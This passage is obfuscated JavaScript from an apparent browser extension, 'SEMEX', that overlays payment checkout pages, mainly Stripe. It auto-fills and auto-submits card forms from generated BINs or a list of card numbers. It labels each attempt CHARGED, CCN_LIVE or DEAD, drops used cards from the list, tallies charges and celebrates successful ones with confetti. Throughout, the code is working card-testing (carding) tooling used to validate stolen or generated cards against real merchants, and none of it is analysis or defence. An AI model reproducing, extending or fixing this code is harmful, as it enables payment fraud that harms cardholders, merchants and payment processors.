      window.addEventListener("message", _0x394c1a);
      // 15s budget: the new-UI iframe fill can legitimately take ~8s+ (lazy
      // card-input wait + sequential field waits), and a TIMEOUT must be
      // treated as a fill failure — never auto-submit an unfilled form.
      setTimeout(() => {
        window.removeEventListener("message", _0x394c1a);
        _0xd60ef6({ ok: false, error: "timeout" });
      }, 15000);
    });
    // CRITICAL: pass the card we just picked/generated. Previously this went
    // out WITHOUT the card, so the fill had to hope a cached copy existed —
    // on PC it often didn't (test card got filled, or nothing filled at all),
    // while mobile timing made the cache hit more likely. Deterministic now.
    window.postMessage({
      type: "SEMEX_FILL_FORM",
      card: _0x5695ac.currentCard || null
    }, "*");
    const _0x243837 = await _0xa35803;
    // Fill reported a failure (no card, unreachable Stripe frame, timeout, not
    // a checkout…) — show the reason and DO NOT submit an unfilled form.
    if (!_0x243837 || _0x243837.ok === false) {
      const _0xerrMap = {
        no_card: "No card — check BIN/CC",
        no_stripe_frame: "Stripe form not ready — retry",
        not_checkout: "Not a checkout page",
        config_unavailable: "Config not loaded — retry",
        extension_outdated: "Extension outdated",
        timeout: "Fill timed out — retry"
      };
      _0x2796fd(_0xerrMap[_0x243837 && _0x243837.error] || "Fill failed — retry", "⚠️");
      return;
    }
    await _0x1db10a(100);
    window.postMessage({
      type: "SEMEX_TRIGGER_SUBMIT"
    }, "*");
    await _0x1db10a(150);
  }
  __name(_0x4e97c4, "triggerFormFill");
  let _0x3e38bb = null;
  let _0x2cef3e = false;
  let _0x454948 = null;
  let _0x2d0e41 = false;
  const _0x50a089 = 300000;
  function _0x28844f(_0x4308a0) {
    var _0x358413;
    var _0x481915;
    var _0x3b1535;
    if (((_0x358413 = _0x4308a0.data) == null ? undefined : _0x358413.type) === "PAYMENT_STATUS_DETECTED") {
      const _0x379fb0 = _0x4308a0.data.status;
      if (_0x379fb0 === "EXPIRED") {
        _0x3e38bb = Date.now();
        _0x2cef3e = false;
      }
      if (_0x379fb0 === "HAS_ACTIVE_SUBSCRIPTION") {
        _0x454948 = Date.now();
        _0x2d0e41 = false;
      }
      if (_0x1ff268 && _0x379fb0) {
        _0x1ff268(_0x379fb0);
      }
      if (_0x379fb0 === "NO_CARDS") {
        _0x2796fd("No cards left!", "⚠️");
        _0x158bbc();
      }
    }
    if (((_0x481915 = _0x4308a0.data) == null ? undefined : _0x481915.type) === "CARD_REPLACED" && _0x4308a0.data.card) {
      _0x5e14b2(_0x4308a0.data.card);
    }
    if (((_0x3b1535 = _0x4308a0.data) == null ? undefined : _0x3b1535.type) === "SEMEX_GLOBAL_STATS_RESULT") {
      const _0x1863fd = _0x4308a0.data.stats || {};
      // Global mode only: update the stat panel from all-time backend totals.
      // In session mode (the default) counters always start at 0 on page load
      // and only increment per result — the panel never shows phantom charges
      // or dead cards from previous sessions before a run has started.
      if (_0x5695ac.statsMode === "global") {
        const _0x10d259 = document.getElementById("statTotal");
        const _0x50a701 = document.getElementById("statCharged");
        const _0x20d179 = document.getElementById("statLive");
        const _0x1423b4 = document.getElementById("statDead");
        if (_0x10d259) {
          _0x10d259.textContent = _0x1863fd.totalCards || 0;
        }
        if (_0x50a701) {
          _0x50a701.textContent = _0x1863fd.charged || 0;
        }
        if (_0x20d179) {
          _0x20d179.textContent = _0x1863fd.ccnLive || 0;
        }
        if (_0x1423b4) {
          _0x1423b4.textContent = _0x1863fd.dead || 0;
        }
      }
    }
    if (_0x4308a0.data && _0x4308a0.data.type === "SEMEX_LOGO_URL" && _0x4308a0.data.url) {
      try {
        _0x5695ac.logoUrl = _0x4308a0.data.url;
        _0xapplyLogo(_0x4308a0.data.url);
      } catch (_0xe) {}
    }
    if (_0x4308a0.data && _0x4308a0.data.type === "SEMEX_BIN_INFO_RESULT") {
      try { _semexUpdateBinInfo(_0x4308a0.data); } catch (_0xe) {}
    }
    if (_0x4308a0.data && _0x4308a0.data.type === "SEMEX_IP_RESULT") {
      try { _semexUpdateIp(_0x4308a0.data); } catch (_0xe) {}
    }
  }
  __name(_0x28844f, "handlePaymentStatusMessage");
  async function _0x5972a0(_0x5ba455, _0x1dae35) {
    if (_0x5ba455 !== "EXPIRED") {
      _0x5695ac.sessionStats.total++;
    } else {}
    if (_0x5ba455 === "CHARGED") {
      _0x5695ac.sessionStats.charged++;
      _0x2796fd("CHARGED!", "✅");
      const _0xcelCfg = window.__extensionSettings || {};
      if (!(_0xcelCfg.celebration && _0xcelCfg.celebration.confetti === false)) {
        _0xConfettiBurst();
      }
    } else if (_0x5ba455 === "CCN_LIVE") {
      _0x5695ac.sessionStats.live++;
      _0x2796fd("CCN_LIVE", "🟡");
    } else if (_0x5ba455 === "DEAD") {
      _0x5695ac.sessionStats.dead++;
      _0x2796fd("DEAD", "🔴");
    } else if (_0x5ba455 === "EXPIRED") {
      _0x2796fd("EXPIRED (Ignored)", "⚪");
    } else if (_0x5ba455 === "TIMEOUT") {
      _0x2796fd("TIMEOUT", "⏱️");
    }
    // Auto-remove the tried card from the CC List (regardless of result) —
    // was silently missing (removal handler existed but nothing sent the
    // message). Only fires when we're in ccList mode and had a real card.
    try {
      if (_0x1dae35 && _0x1dae35.number) {
        const _s = window.__extensionSettings || {};
        const _mode = (_s.binOrCCList && _s.binOrCCList.mode) || "bin";
        if (_mode === "ccList") {
          window.postMessage({ type: "SEMEX_REMOVE_CARD", card: _0x1dae35 }, "*");
          // Proactive empty-list detection: predict remaining cards after removal
          // so the overlay updates immediately instead of waiting up to the full
          // jitter delay (up to 9 s) before the loop head detects the empty list.
          try {
            const _0xUsedNum = String(_0x1dae35.number).replace(/\D/g, "");
            // Mirror the content-script's first-match-only removal so the
            // predicted remaining count is consistent with what will actually
            // be stored.  filter() would over-remove when the same number
            // appears on multiple lines (different expiry variants).
            const _0xAllLines = _semexCcLines();
            const _0xFirstMatchIdx = _0xAllLines.findIndex(_0xl =>
              String(_0xl).split("|")[0].replace(/\D/g, "") === _0xUsedNum
            );
            const _0xRemaining = _0xFirstMatchIdx !== -1
              ? _0xAllLines.filter((_, _0xi) => _0xi !== _0xFirstMatchIdx)
              : _0xAllLines;
            if (_0xRemaining.length === 0 && _0x5695ac.isRunning) {
              // Stop first (sets status to "Stopped"), then override with the
              // specific exhausted-list message so it's what the user sees.
              _0x158bbc();
              _0x2796fd("No cards left!", "⚠️");
            }
          } catch (_0xchkErr) {}
        }
      }
    } catch (e) {}
    _0xba4edd();
  }
  __name(_0x5972a0, "handleResult");
  function _0x1db10a(_0x74df8) {
    return new Promise(_0x1470a2 => setTimeout(_0x1470a2, _0x74df8));
  }
  __name(_0x1db10a, "sleep");
  function _0xConfettiBurst() {
    try {
      // v2.8.6 — dedupe against the toast notifier's confetti (both fired on
      // CHARGED → two 80-piece systems = visible lag). Shared timestamp wins.
      const _now = Date.now();
      if (window.__semexConfettiAt && _now - window.__semexConfettiAt < 2500) return;
      window.__semexConfettiAt = _now;
      let _layer = document.getElementById("semex-confetti-layer");
      if (!_layer) { _layer = document.createElement("div"); _layer.id = "semex-confetti-layer"; document.body.appendChild(_layer); }
      const _colors = ["#8B5CF6", "#EC4899", "#10B981", "#a78bfa", "#f0abfc", "#34d399"];
      for (let _i = 0; _i < 80; _i++) {
        const _p = document.createElement("div");
        _p.className = "semex-confetti-piece";
        const _size = 6 + Math.random() * 8;
        const _dur = 1.7 + Math.random() * 1.5;
        const _delay = Math.random() * 0.3;
        _p.style.left = (Math.random() * 100) + "vw";
        _p.style.width = _size + "px";
        _p.style.height = (_size * 1.5) + "px";
        _p.style.background = _colors[_i % _colors.length];
        _p.style.animationDuration = _dur + "s";
        _p.style.animationDelay = _delay + "s";
        if (Math.random() > 0.5) { _p.style.borderRadius = "50%"; }
        _layer.appendChild(_p);
        setTimeout(() => { try { _p.remove(); } catch (e) {} }, (_dur + _delay) * 1000 + 250);
      }
      setTimeout(() => { try { if (_layer && !_layer.children.length) _layer.remove(); } catch (e) {} }, 4000);
    } catch (e) {}
  }
  __name(_0xConfettiBurst, "confettiBurst");
  window.addEventListener("message", _0x501e9f => {
    if (_0x501e9f.source !== window) return; // ignore cross-frame forgeries
    if (_0x501e9f.data && _0x501e9f.data.type === "SEMEX_SETTINGS_UPDATE") {
      window.__extensionSettings = _0x501e9f.data.settings;
      try { _semexUpdateBinLabel(); } catch (_0xe) {}
    }
    // Surface storage-write failures from the content-script bridge so the user
    // sees a retry prompt instead of a silent no-op (happens when the extension
    // context is invalidated mid-session while the picker is open).
    if (_0x501e9f.data && (_0x501e9f.data.type === "SEMEX_SET_LIST_MODE_ERROR" || _0x501e9f.data.type === "SEMEX_SET_CC_ACTIVE_ERROR" || _0x501e9f.data.type === "SEMEX_SET_ACTIVE_BIN_ERROR")) {
      try {
        const _0xerr = String(_0x501e9f.data.error || "").toLowerCase();
        const _0xmsg = _0xerr.indexOf("invalidated") !== -1
          ? "Extension reloaded \u2014 refresh page to reconnect"
          : "Save failed \u2014 try again";
        _0x2796fd(_0xmsg, "⚠️");
        setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 3000);
      } catch (_0xe) {}
    }
    // Feedback for BIN uploads to the account (SEMEX_SAVE_BIN).
    if (_0x501e9f.data && _0x501e9f.data.type === "SEMEX_SAVE_BIN_RESULT") {
      try {
        if (_0x501e9f.data.ok) {
          _0x2796fd(_0x501e9f.data.duplicate ? "BIN already in library" : "BIN saved to account ☁️", "💳");
        } else {
          _0x2796fd("BIN active locally — account sync failed", "⚠️");
        }
        setTimeout(() => { try { if (!_0x5695ac.isRunning) _0x2796fd("Ready", "🔄"); } catch (_0xe) {} }, 2500);
      } catch (_0xe) {}
    }
  });
  function _0xa62633() {
    window.postMessage({
      type: "SEMEX_REQUEST_SETTINGS"
    }, "*");
  }
  __name(_0xa62633, "requestSettings");
  function _0x150429() {
    // The document_start bootstrap pre-creates a hidden EMPTY root on every
    // page for provenance — only a POPULATED root (real controls present)
    // means the overlay is already live.
    const _0xexistingRoot = document.getElementById("semex-overlay");
    if (_0xexistingRoot && _0xexistingRoot.querySelector("#ctrlStart")) {
      return;
    }
    // Merchant-embedded Stripe Payment Element: overlay.js was dynamically
    // injected after content.js spotted the js.stripe.com iframe — accept the
    // iframe itself as the checkout signal (host/pathname checks all fail on
    // arbitrary merchant domains).
    let _0xembedStripe = false;
    try { _0xembedStripe = Array.from(document.querySelectorAll("iframe")).some(function(_f){ return (_f.src || "").includes("js.stripe.com"); }); } catch (_0xeEmb) {}
    const _0x28540c = window.location.hostname.includes("stripe.com") || window.location.hostname.includes("checkout.stripe.com") || document.querySelector("[data-stripe-checkout]") || sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true" || _semexIsGatewayCheckoutPage() || _0xembedStripe;
    if (_0x28540c) {
      _0x1e815c();
      _0xba4edd();
      _0xa62633();
      window.postMessage({
        type: "SEMEX_GET_BLUR_STATE"
      }, "*");
    }
  }
  __name(_0x150429, "initSemexOverlay");
  window.addEventListener("message", _0x36f344 => {
    if (_0x36f344.source !== window) return; // ignore cross-frame forgeries
    if (_0x36f344.data && _0x36f344.data.type === "SEMEX_BLUR_STATE_RESULT") {
      _0x5695ac.isBlurred = !!_0x36f344.data.enabled;
      // v4.0: restore visual blur on the three sensitive detail elements and
      // sync the Hide button icon — the old handler used removed IDs
      // (overlayBlurBtn / stripe-automation-overlay) and never applied blur.
      const _0xblurFilter = _0x5695ac.isBlurred ? "blur(4px)" : "none";
      ["detailCard", "detailBinInfo", "detailIp"].forEach(_0xid => {
        const _0xnode = document.getElementById(_0xid);
        if (_0xnode) _0xnode.style.filter = _0xblurFilter;
      });
      const _0xovrRoot2 = document.getElementById("semex-overlay");
      if (_0xovrRoot2) _0xovrRoot2.classList.toggle("details-hidden", _0x5695ac.isBlurred);
      const _0xctrlBlur = document.getElementById("ctrlBlur");
      if (_0xctrlBlur) {
        _0xctrlBlur.textContent = _0x5695ac.isBlurred ? "👁️" : "🔒";
        _0xctrlBlur.title = _0x5695ac.isBlurred ? "Show hidden details" : "Hide card / BIN / IP";
      }
    }
  });
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", _0x150429);
  } else {
    _0x150429();
  }
  window.SemexOverlay = {
    setStatus: _0x2796fd,
    setCardDisplay: _0x5e14b2,
    updateStatsDisplay: _0xba4edd,
    startAutomation: _0x3ba8fe,
    pauseAutomation: _0x33d51e,
    stopAutomation: _0x158bbc
  };
})();
/* ==================== SEMEX Overlay drag support ==================== */
(function semexOverlayDrag() {
  const STORAGE_KEY = "semex_overlay_position";

  function apply(pos) {
    const el = document.getElementById("semex-overlay");
    if (!el) return;
    // Kill preset pos-* classes when the user has dragged
    el.classList.remove("pos-bl", "pos-br", "pos-tl", "pos-tr");
    el.style.left = pos.left + "px";
    el.style.top  = pos.top  + "px";
    el.style.right = "auto";
    el.style.bottom = "auto";
  }

  function restore() {
    try {
      const raw = localStorage.getItem(STORAGE_KEY);
      if (!raw) return;
      const pos = JSON.parse(raw);
      if (pos && typeof pos.left === "number" && typeof pos.top === "number") {
        apply(pos);
      }
    } catch (e) {}
  }

  function persist(left, top) {
    try { localStorage.setItem(STORAGE_KEY, JSON.stringify({ left, top })); } catch (e) {}
  }

  function attach() {
    const overlay = document.getElementById("semex-overlay");
    const handle = overlay && overlay.querySelector(".full-header");
    if (!overlay || !handle || handle.dataset.semexDrag === "1") return;
    handle.dataset.semexDrag = "1";
    handle.style.cursor = "move";
    handle.title = "Drag to move";

    let dragging = false;
    let startX = 0, startY = 0, origLeft = 0, origTop = 0;

    handle.addEventListener("mousedown", (ev) => {
      // Ignore clicks on the header buttons themselves — those should still work.
      if (ev.target.closest && ev.target.closest(".header-btn")) return;
      dragging = true;
      const rect = overlay.getBoundingClientRect();
      startX = ev.clientX; startY = ev.clientY;
      origLeft = rect.left; origTop = rect.top;
      overlay.classList.add("is-dragging");
      ev.preventDefault();
    });

    window.addEventListener("mousemove", (ev) => {
      if (!dragging) return;
      const dx = ev.clientX - startX;
      const dy = ev.clientY - startY;
      // Clamp within viewport with a small margin so the overlay is always grabbable.
      const w = overlay.offsetWidth, h = overlay.offsetHeight;
      const maxLeft = Math.max(0, window.innerWidth - w);
      const maxTop  = Math.max(0, window.innerHeight - h);
      const left = Math.max(0, Math.min(maxLeft, origLeft + dx));
      const top  = Math.max(0, Math.min(maxTop, origTop + dy));
      apply({ left, top });
    });

    window.addEventListener("mouseup", () => {
      if (!dragging) return;
      dragging = false;
      overlay.classList.remove("is-dragging");
      const rect = overlay.getBoundingClientRect();
      persist(Math.round(rect.left), Math.round(rect.top));
    });

    restore();
  }

  // Wait a beat because the overlay may be injected after us on some pages.
  const boot = () => { attach(); setTimeout(attach, 500); setTimeout(attach, 1500); };
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
